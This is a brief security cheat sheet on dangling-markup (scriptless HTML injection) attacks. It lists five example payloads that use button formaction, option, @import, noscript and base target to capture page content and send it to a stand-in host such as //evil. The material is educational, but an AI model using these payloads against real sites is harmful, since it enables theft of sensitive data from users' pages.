#  HTML Scriptless Attacks / Dangling Markup Attacks (Part - 1)
Index | Section
--- | ---
**1** | Introduction 
**2** | Interesting Attack Vectors (Part - 1)
**3** | References & Good Reads

___
#### Introduction
```
1. Dangling markup attack is often known as HTML Scriptless Injection attack. This is often useful when you have HTML Injection vulnerability but not a way to escalate it to XSS and you want to extract information.

2. It can also be used in the situations where some sensitive data is stored in HTML as clear text. This attack can be used to exfiltrate that information.

```


#### Interesting Attack Vectors (Part - 1)
```
(Credits: http://www.thespanner.co.uk/2011/12/21/html-scriptless-attacks/)

1. Button as a Scriptless Vector

- In HTML5, the default type for a button is a submit and the "formaction" attribute allows to change the parent form action.
- Also, it is possible to stroe any html after button until the next or non existent closing button tag.
- Example: <button name=xss type=submit formaction=//evil>I get consumed!

2. Option as a Scriptless Vector

- Option also consumes HTML and can be used as an attack vector
- Example: <form action=//evil><select name=xss><option><b>steal me!</b>

3. @import as a scriptless Vector

-  @import continues parsing a url until it encounters a ending “;”. It means it can be used to consume HTML. 
- Example: 
			<style>@import//hackvertor.co.uk?
			<b>steal me!</b>;

4. Noscript scriptless vector

- Example: <noscript><form action=http://google.com><input type=submit style="position:absolute;left:0;top:0;width:100%;height:100%;" type=submit value=pwnd><textarea name=contents></noscript>
				
5. Using window.name via base target
				
- You can also use the target attribute to assign the contents of the HTML after to the window name and then later retrieve it x-domain after a user clicks an external link.

- Example: <base target='
steal me'<b>test</b>

```


#### References & Good Reads

```
a. http://www.thespanner.co.uk/2011/12/21/html-scriptless-attacks/

```